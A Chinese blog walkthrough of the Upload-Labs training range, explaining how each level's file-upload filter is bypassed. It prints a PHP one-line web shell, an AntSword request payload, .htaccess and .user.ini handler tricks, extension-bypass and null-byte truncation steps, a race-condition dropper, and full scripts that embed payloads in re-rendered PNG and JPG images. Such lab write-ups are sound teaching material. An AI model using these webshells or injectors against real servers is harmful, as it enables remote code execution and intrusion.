# Upload-Labs通关

**目录**

[TOC]





## 问题

 [记录BUG—在uploadlabs第三关中—关于phpstudy中修改httpd.conf依旧无法解析.php3d等问题_upload第三关常见错误_dfzy$_$的博客-CSDN博客](https://blog.csdn.net/qq_43696276/article/details/126445465) 

## 我们首先先来了解一下什么是文件上传

```undefined
首先 很简单
文件上传就是 需要用户进行上传文件 图片或视频等信息
```

但是如果用户恶意上传木马怎么办？

这里由提到了木马

## 一句话木马

我们在文件上传的时候 天天都是一句话木马

但是这个木马到底是什么呢

首先我们先要了解一下

### web是用什么语言开发的

目前存在

```cobol
ASP/PHP/JSP/ASPX
 
这些都是web开发的语言
```

### 最简单的一句话木马

```php
   <?php @eval($_POST['attack']);?>
```

#### 解释

```php
这里存在了几个方面
 
1.<?php ?>
2.@
3eval()
4$_POST['attack']
 
 
我们一个一个解释
 
 
1.就是php语言
 
2.@出现就是说 发生错误 也不进行报错
 
3.eval()  把（）里面的当做命令来执行
 
4.$_POST['attack']  在该路径下接受attack参数 
 
 
假如我们传入 attack='ls'
 
那么就会被解析为 
 
<?php eval('ls')?>
那么就会执行 ls这个命令
```

## 了解完一句话木马 我们了解一下 蚁剑的工作原理

通过指定端口进行抓包可以发现

```php
@ini_set("display_errors", "0");
@set_time_limit(0);
function asenc($out){
	return $out;
};
function asoutput(){
$output=ob_get_contents(); //返回输出缓冲区的内容
ob_end_clean(); //清理(擦除)缓冲区并关闭输出缓冲
echo "c6b05fd97";
echo @asenc($output);echo "d69e35d304";}
ob_start(); //打开输出缓冲区
try{
$D=dirname($_SERVER["SCRIPT_FILENAME"]); //获取当前url路由的绝对路径
if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]); //当前脚本所在文件系统（非文档根目录）的基本路径
$R="{$D}	";
if(substr($D,0,1)!="/"){
foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";
}
else{
$R.="/";}$R.="	";
$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
$s=($u)?$u["name"]:@get_current_user();
$R.=php_uname();
$R.="	{$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die(); //获取目录，uid，系统信息，用户等信息
```



## Pass-1  前端验证



<img src="https://i-blog.csdnimg.cn/blog_migrate/96a56b717a7510eec844f685ad588e91.png" alt="" style="max-height:328px; box-sizing:content-box;" />


提示要上传的是图片

我们看看如果不上传图片会怎么样



<img src="https://i-blog.csdnimg.cn/blog_migrate/5bf92a69500b6b77a501c2eae0699949.png" alt="" style="max-height:134px; box-sizing:content-box;" />


发现被过滤了

我们来看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/cce791f4806d0b71204646b3629cf4e9.png" alt="" style="max-height:306px; box-sizing:content-box;" />


发现只能上传 jpg png gif的文件 并且这个是一个js函数

这里有两个方式

### 1.通过浏览器的插件 关闭这个前端函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/337409ef612e7242d263900a317bacb8.png" alt="" style="max-height:95px; box-sizing:content-box;" />


然后就可以上传 一句话木马了

### 2.通过bp来抓包修改后缀

上传图片马



<img src="https://i-blog.csdnimg.cn/blog_migrate/5c60326c3c5d9a5da9f807a83c7e4f5b.png" alt="" style="max-height:414px; box-sizing:content-box;" />




修改为php 放包

最后通过蚁剑连接一下就可以了

## Pass-2  文件类型的匹配

这道题是文件类型的匹配



<img src="https://i-blog.csdnimg.cn/blog_migrate/1e5be877ce6a2385a510bd4eb4c2bf57.png" alt="" style="max-height:146px; box-sizing:content-box;" />


通过源代码 可以发现 上传的类型 要是

```bash
image/jpeg
image/png
imgae/gif
```

这类才可以实现上传

这题和第一题的第二个解法一样

通过上传 jpg 修改后缀即可

## Pass-3  黑名单过滤不全

这道题只过滤了一个 php

我们首先关闭前端验证

然后fuzz一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/638b9bd517d7e189f91c8b7544ec7a23.png" alt="" style="max-height:275px; box-sizing:content-box;" />




发现 只要不是php 就都可以

我们直接上传一个 phtml类 链接即可

## Pass-4  .htaccess

首先我们了解一下什么事.htaccess

```undefined
如果我们不存在服务器的root权限 
但是想修改 服务器配置 就可以在 apache中打开选项
然后我们就可以通过 .htaccess 来配置服务器了
```

在.htaccess 中写入

```cobol
<FilesMatch "shell.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

首先指定 shell.png

然后作为php文件执行

在这道题

我们首先上传 .htaccess 然后上传 shell.png 即可

然后访问 shell.png 链接即可

## Pass-5 .user.ini

 [Upload-labs Pass-05 .user.ini文件上传_upload labs user.ini_baynk的博客-CSDN博客](https://blog.csdn.net/u014029795/article/details/117252533) 



首先了解什么是 .user.ini

.user.ini 其实就是用户自定义的 php.ini

我们可以通过写入

```cobol
auto_prepend_file = 木马名
```

来让我们访问该网站的文件的时候 自动包含我们的木马

我们可以进行测试

```cobol
auto_prepend_file = shell.png
```

我们上传 .user.ini



<img src="https://i-blog.csdnimg.cn/blog_migrate/d8052d95b9a17c425f6569eb4584e2f1.png" alt="" style="max-height:107px; box-sizing:content-box;" />


再上传 shell.png



<img src="https://i-blog.csdnimg.cn/blog_migrate/d36db765e6ac6a68c1cf77e2c8e021d8.png" alt="" style="max-height:141px; box-sizing:content-box;" />


其中 目录下一直存在一个readme.php

那我们网站访问 该php的时候 shell.png自动会被包含在其中

记住该靶场现在的是  


<img src="https://i-blog.csdnimg.cn/blog_migrate/6b844b394ee8c878ef5e9883eb557db2.png" alt="" style="max-height:292px; box-sizing:content-box;" />


该版本  
phpinfo需要是CGI这个  


<img src="https://i-blog.csdnimg.cn/blog_migrate/9769ae689d1957a5121f63b7e1d03c8b.png" alt="" style="max-height:86px; box-sizing:content-box;" />




才可以使用 .user.ini  
按照上面的上传  
然后访问 readme.php  
shell.png就已经被自动包含在这个文件内了  
我们只需要链接即可  
记住链接的路径也是该文件

```bash
upload/readme.php
```

## Pass-6   php后缀大小写绕过





<img src="https://i-blog.csdnimg.cn/blog_migrate/af5f686a8812ae7b829ac726cc3fc4bc.png" alt="" style="max-height:125px; box-sizing:content-box;" />


发现修改了

所以我们只能通过另一个方法了

就是修改php后缀

在windows中 php Php phP pHp都可以作为php文件执行

所以我们抓包修改为 phP后缀



<img src="https://i-blog.csdnimg.cn/blog_migrate/a9d83d23242e44f3241903652240390b.png" alt="" style="max-height:82px; box-sizing:content-box;" />


发现上传成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/6fc380ec02b7dbbb7033e75ce6240042.png" alt="" style="max-height:640px; box-sizing:content-box;" />


链接也可以成功

## Pass-7  空格绕过

通过比对源代码

发现少了 文件末尾去空格个这个

在windows 中 如果你手动在后缀未中加空格

系统会自动删除

这个就是利用这个

通过 php空格 绕过检查 然后windows删除空格 变为 php

所以通过抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/3327606b75e8bba4dc0b3b77e89dfd33.png" alt="" style="max-height:91px; box-sizing:content-box;" />


加一个空格



<img src="https://i-blog.csdnimg.cn/blog_migrate/4527d31e9164a325225fd13a73fe2853.png" alt="" style="max-height:447px; box-sizing:content-box;" />








<img src="https://i-blog.csdnimg.cn/blog_migrate/101d5e021e8702bbc1d718a601686d0a.png" alt="" style="max-height:101px; box-sizing:content-box;" />


发现上传 成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce45b86537b68274443e3759136066f8.png" alt="" style="max-height:640px; box-sizing:content-box;" />


## Less-8  点绕过

这个特性也是windows的

和空格类似

如果输入 1.txt. windows会自动识别为 1.txt 去掉 点



<img src="https://i-blog.csdnimg.cn/blog_migrate/618c988b787e9e1afc835b4701dc02c1.png" alt="" style="max-height:113px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/fe8e31b3d5191916ff58a2ed439704d3.png" alt="" style="max-height:434px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/08d6e689ee1c1fc9f805fb4ecb1e2f12.png" alt="" style="max-height:113px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/0a4d4820367fedca0bff3801607efd55.png" alt="" style="max-height:640px; box-sizing:content-box;" />


## Pass-9  ：：$DATA 绕过

 [https://www.cnblogs.com/1ink/p/15102288.html](https://www.cnblogs.com/1ink/p/15102288.html) 

 [NTFS ADS的前世今生 - 简书](https://www.jianshu.com/p/7842ee248621) 

我们写入

shell.php::$DATA

这个时候 服务器首先读取 $后是否为分区的可执行文件

发现属于数据流

所以服务器并不会认为这个是一个php文件

但是操作系统知道这个是一个php文件 就会把里面的内容返回到目录中

这样就绕过了黑名单

抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/0103ab9465c670b71b3f005940c72ebe.png" alt="" style="max-height:186px; box-sizing:content-box;" />




上传成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/f57977fa1d8b16bb13a67c2367497d60.png" alt="" style="max-height:154px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/19c746425d4694708edb9311b7b48f4a.png" alt="" style="max-height:640px; box-sizing:content-box;" />


## Pass-10  无换名且无循环过滤 点空格点 绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/48e70c27c150fa18f773e46b1987d313.png" alt="" style="max-height:224px; box-sizing:content-box;" />


发现把我们之前的全过滤了

但是其实没有过滤完整

通过fuzz可以发现



<img src="https://i-blog.csdnimg.cn/blog_migrate/d3532dc7009e0afa3ec16e301e70cc73.png" alt="" style="max-height:79px; box-sizing:content-box;" />


这些其实可以上传的



<img src="https://i-blog.csdnimg.cn/blog_migrate/7f0c3150a58d932c94e6093e977b37b2.png" alt="" style="max-height:52px; box-sizing:content-box;" />


并且可以通过 pHp1

链接

但是这道题我们主要的做法不是这个

我们首先通过上传shell.php来分析

```cobol
 if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
假设没有过滤
        $file_name = trim($_FILES['upload_file']['name']);
读取名和后缀  shell 和.php
        $file_name = deldot($file_name);//删除文件名末尾的点
删除文件名的 shell.php
        $file_ext = strrchr($file_name, '.');
从.开始读取作为后缀 这里读取完是 php
        $file_ext = strtolower($file_ext); //转换为小写
还是php
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
还是php
        $file_ext = trim($file_ext); //首尾去空
还是php
        
        if (!in_array($file_ext, $deny_ext)) {
如果不在黑名单
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
直接把 原文件上传
 
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true; 
```

这里我们发现

1. 只过滤1次

2.没有修改名字和后缀

所以我们可以通过构造 . . 来绕过 点空点

这样过滤后就只剩点

例如

shell.php. .

过滤完

shell.php.

这样就实现了上传



<img src="https://i-blog.csdnimg.cn/blog_migrate/f3cba632ce1bb987d2149e7dd4758f10.png" alt="" style="max-height:101px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/60b05cf0bb1c6c09f039a8b21f94bfd0.png" alt="" style="max-height:41px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/3cf188abb01d6f733a4792500aa9a835.png" alt="" style="max-height:640px; box-sizing:content-box;" />


## Pass-11  双写绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/2816aac4b13e37c3c022be0a2e3ffa03.png" alt="" style="max-height:253px; box-sizing:content-box;" />




发现黑名单会被替换为空

这样就和sql注入一样的办法即可

双写绕过

pphphp

我们试试看



<img src="https://i-blog.csdnimg.cn/blog_migrate/359ee999707bc7c62b8d59866a62c9a3.png" alt="" style="max-height:194px; box-sizing:content-box;" />






<img src="https://i-blog.csdnimg.cn/blog_migrate/e50c98f0c64c89c24158b0ad7446a3af.png" alt="" style="max-height:109px; box-sizing:content-box;" />


上传成功

## Pass-12  白名单过滤和GET的00截断

首先 00截断是因为系统读取到了 %00后就默认结束了

就会截断后面的字符串

第二

利用条件

php 要小于 5.3.4

php.ini里

<img src="https://i-blog.csdnimg.cn/blog_migrate/d4b6c949fba2be60d14a4ab16d212a45.png" alt="" style="max-height:188px; box-sizing:content-box;" />




我们可以开始利用



<img src="https://i-blog.csdnimg.cn/blog_migrate/fb0e6cdb6a65c887f4a423995042de1e.png" alt="" style="max-height:332px; box-sizing:content-box;" />


猜测是白名单过滤

我们抓包看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/87e8d9ffb9085cf3d1a3776d3c24aaff.png" alt="" style="max-height:363px; box-sizing:content-box;" />




发现 POST类型 但是存在GET参数

并且写着 save_path

保存地址

这里就是我们利用%00截断的地方

我们通过源代码也能发现



<img src="https://i-blog.csdnimg.cn/blog_migrate/58e3ec9aa88e500fdd16cf0f0a5ef139.png" alt="" style="max-height:81px; box-sizing:content-box;" />


存放的方式就是

/upload/随机数日期.后缀

其中upload是get参数的

那我们就可以通过get来截断

/upload/1.php%00随机数日期.后缀

1.php是我们随便构造的 用来保存内容

如果我们不截断

他就是现在这样



<img src="https://i-blog.csdnimg.cn/blog_migrate/ae62a602b112045919865544a58c9bd0.png" alt="" style="max-height:86px; box-sizing:content-box;" />


如果我们截断了



<img src="https://i-blog.csdnimg.cn/blog_migrate/2ee527e20f014a67e5165dc1f5c52227.png" alt="" style="max-height:123px; box-sizing:content-box;" />




他就会变为



<img src="https://i-blog.csdnimg.cn/blog_migrate/570279c43ede5aefe12508b62b4143f4.png" alt="" style="max-height:136px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/65b758e2aec87d04c94dbe02c22b6864.png" alt="" style="max-height:640px; box-sizing:content-box;" />


绕过成功

## Pass-13  POST类型的00截断和通过bp修改来实现00截断

和12一样

抓包后就发现了 post中存在 上传路径

直接00截断



<img src="https://i-blog.csdnimg.cn/blog_migrate/abff5cc2b22fcb5b73e8867607168cd9.png" alt="" style="max-height:151px; box-sizing:content-box;" />


但是这里存在一个问题

POST类型并不会和GET一样自动解码

所以我们使用BP来修改



<img src="https://i-blog.csdnimg.cn/blog_migrate/69c4ff0ca5ada632b62ac9e9dc5d47ad.png" alt="" style="max-height:59px; box-sizing:content-box;" />


+的十六进制是2b



<img src="https://i-blog.csdnimg.cn/blog_migrate/e59c0cac429aedce830b08f84f72978c.png" alt="" style="max-height:97px; box-sizing:content-box;" />


点击hex



<img src="https://i-blog.csdnimg.cn/blog_migrate/545ab5f56dd739b95c37f6fa5ee1ea6a.png" alt="" style="max-height:139px; box-sizing:content-box;" />


在2b位置修改为00



<img src="https://i-blog.csdnimg.cn/blog_migrate/a683f44f0d1965dc92a03b11c7062f7e.png" alt="" style="max-height:67px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/c5097193e6d46bf15dbac7452ef1e3e1.png" alt="" style="max-height:104px; box-sizing:content-box;" />


然后放包



<img src="https://i-blog.csdnimg.cn/blog_migrate/34899f7890ea7dcb6d744bb1565289db.png" alt="" style="max-height:133px; box-sizing:content-box;" />


上传成功

## Pass-14 图片马的制作和通过文件上传来实现shell

首先我们看看这道题目的源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/3f682111abc67d915db4b07e5b5665f1.png" alt="" style="max-height:538px; box-sizing:content-box;" />




通过读取两个字节 并且把两个字节变为 10进制

然后链接在一起

进行比对 如果是255216 变为jpg

这里我们首先构造图片马

图片马 首先需要图片是一个正常的图片 因为需要绕过检测

然后把我们的一句话木马写入即可

```cobol
copy 图片/b + 木马/a 最后的名字
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/40d681a0bad42ead500bf890e11569bd.png" alt="" style="max-height:106px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/a395e8f60e36fcc0d19bc04d8cebdfb2.png" alt="" style="max-height:242px; box-sizing:content-box;" />


上传成功

通过文件上传漏洞来看看

能不能访问这个文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/ab96d2d46d624de59689107cd46539ad.png" alt="" style="max-height:638px; box-sizing:content-box;" />


执行成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/69d024fdbf6733e7d28d8e487c71416a.png" alt="" style="max-height:640px; box-sizing:content-box;" />


## Pass-15 辨识识别图片的函数

这个用14的做法就可以上传图片码

主要是看看源代码来了解一下函数

```scss
getimagesize($filename);
获取图片的大小
image_type_to_extension($info[2]) 
获取图片的后缀
 
stripos($types,$ext)
 
判断 type中存不存在ext  不区分大小写
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0b1e955933a6ab4009bac75275d41f2b.png" alt="" style="max-height:660px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/5f802f846fc2d9f6c0d9a25cc06cb034.png" alt="" style="max-height:640px; box-sizing:content-box;" />


## Pass-16 php_exif



<img src="https://i-blog.csdnimg.cn/blog_migrate/84eac4d0044371f1e4b89efff69a90c0.png" alt="" style="max-height:566px; box-sizing:content-box;" />


首先打开 php_exif

其次就是和之前一样 上传图片码

这里的 php_exif 就是识别上传的类型

```kotlin
    case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
```

识别为3个类型其中一个才可以过

就可以了

## Pass-17 二次渲染

 [【文件上传绕过】——二次渲染漏洞_二次渲染绕过_剑客 getshell的博客-CSDN博客](https://blog.csdn.net/weixin_45588247/article/details/119177948) 

首先 通过源代码和上传测试 我们能发现 所有的上传 都被重新命名 和重新渲染

就是重新修改了文件中的数据 只留下了 和图片信息有关的内容

### GIF的二次渲染绕过

这里主要 是对GIF 因为GIF对文件的格式要求精度不高

所以不会容易损坏

首先我们传入一个GIF



<img src="https://i-blog.csdnimg.cn/blog_migrate/9bd726fe5e516161734049fd045d2663.png" alt="" style="max-height:218px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/0ec61425d4352cd71a212e8d628ea94b.png" alt="" style="max-height:107px; box-sizing:content-box;" />


使用010打开这个文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/92d25c86736dd541c7ce873d42fb7f55.png" alt="" style="max-height:224px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/bc42296759101c8cf20f26b9eec0f171.png" alt="" style="max-height:461px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/6cc8916dd26780614217be34fbced608.png" alt="" style="max-height:302px; box-sizing:content-box;" />


这里匹配就是两个文件都存在的内容

这里我们要注意

我们写入一句话的时候 不能破坏图片 不然就是无法注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/6d6595ed57a0378f2c446a9f173d9d6f.png" alt="" style="max-height:136px; box-sizing:content-box;" />




我们来保存后重新上传



<img src="https://i-blog.csdnimg.cn/blog_migrate/e6f1afe84275684377cbe62203ef9011.png" alt="" style="max-height:363px; box-sizing:content-box;" />


注意我们写入的时候最好写在不破坏图片内容的地方 不然有可能无法实现绕过

### PNG的二次渲染绕过

我的window没有配置php 所以使用kali

```cobol
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
 
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,'./1.png');
?>
```

然后执行

```undefined
php 大牛的代码 
```

就会自动生成png图片

然后上传即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/1bd2b53cc7e75add86d69f135b37eb49.png" alt="" style="max-height:226px; box-sizing:content-box;" />


<img src="https://i-blog.csdnimg.cn/blog_migrate/e906e6b7887ddbed4504b2f6580ebb25.png" alt="" style="max-height:268px; box-sizing:content-box;" />




成功



### JPG的二次渲染绕过

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */
 
    $miniPayload = "<?=phpinfo();?>";
 
 
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
 
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
 
    set_error_handler("custom_error_handler");
 
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
 
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
 
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
 
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

一样的代码 但是这次需要指定jpg文件

最好多选几次



<img src="https://i-blog.csdnimg.cn/blog_migrate/86964201f422b29fa80ef9aee28e2d7e.png" alt="" style="max-height:144px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/2edb94ca34c1bf2cb5c6f066827b9eaa.png" alt="" style="max-height:291px; box-sizing:content-box;" />


反正我是试了很多次图片 才可以上传成功



## Less-18 条件竞争

先给出一句话木马

```php
<?php fputs(fopen('2.php','w'),'<?php phpinfo();?>');?>
```

这个的意思是如果访问了该文件 那么就生成一个 2.php写入phpinfo

### 条件竞争是什么呢

当一个事务为多线程的时候

一个事务还没有结束 但是另一个事务立马访问了

这样就会形成没有"扣款"

运用到这里就是 我们上传的木马 还没有删除 就被访问了 这样就会留下我们的另一个木马



<img src="https://i-blog.csdnimg.cn/blog_migrate/dcc84b42bae1e44d5fbac3afa4896733.png" alt="" style="max-height:540px; box-sizing:content-box;" />


这里注意的是

```scss
move_uploaded_file()函数将上传文件临时保存，再进行判断
```

这里我们可以开始看看这道题目

写入木马抓包 发到爆破



<img src="https://i-blog.csdnimg.cn/blog_migrate/0cb2f1beb879c4bd8e6e913ddea092fd.png" alt="" style="max-height:260px; box-sizing:content-box;" />


开始

然后我们去访问 1.php

然后就会生成2.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/889447b63ad9ac6b5f015b4751033d5f.png" alt="" style="max-height:151px; box-sizing:content-box;" />


这个时候去访问2.php 就得到了shell



<img src="https://i-blog.csdnimg.cn/blog_migrate/1d4d9010751f619c3b2525d13c20909c.png" alt="" style="max-height:411px; box-sizing:content-box;" />


## Less-19 条件竞争/图片码

 [Upload-labs 1-21关 靶场通关攻略(全网最全最完整)_upload靶场_晚安這個未知的世界的博客-CSDN博客](https://blog.csdn.net/weixin_47598409/article/details/115050869) 

这里补充一下条件竞争的前提

是服务器暂时保存 ->比对->删除

我们打的就是时间差

这道题目也是通过条件竞争来绕过

无法使用apache特性

```python
就是apache遇到无法解析的后缀
就会从右边往左边解析
 
 
所以可以构造 shell.php.zip
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/432910b616b8e48d0cd342cbcc74eebe.png" alt="" style="max-height:196px; box-sizing:content-box;" />




还是老老实条件竞争吧

```php
   $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
```

先对其进行上传

然后使用Myupload的upload方法

来对上传的进行判断

```php
    case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
```

下面是Myupload的代码

```cobol
//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );
 
......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }
 
    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }
 
    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }
 
    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
 
    // if we are here, we are ready to move the file to destination
 
    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
 
    // check if we need to rename the file
 
    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)
 
    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

这里主要是收集一些图片的信息

并且设置白名单

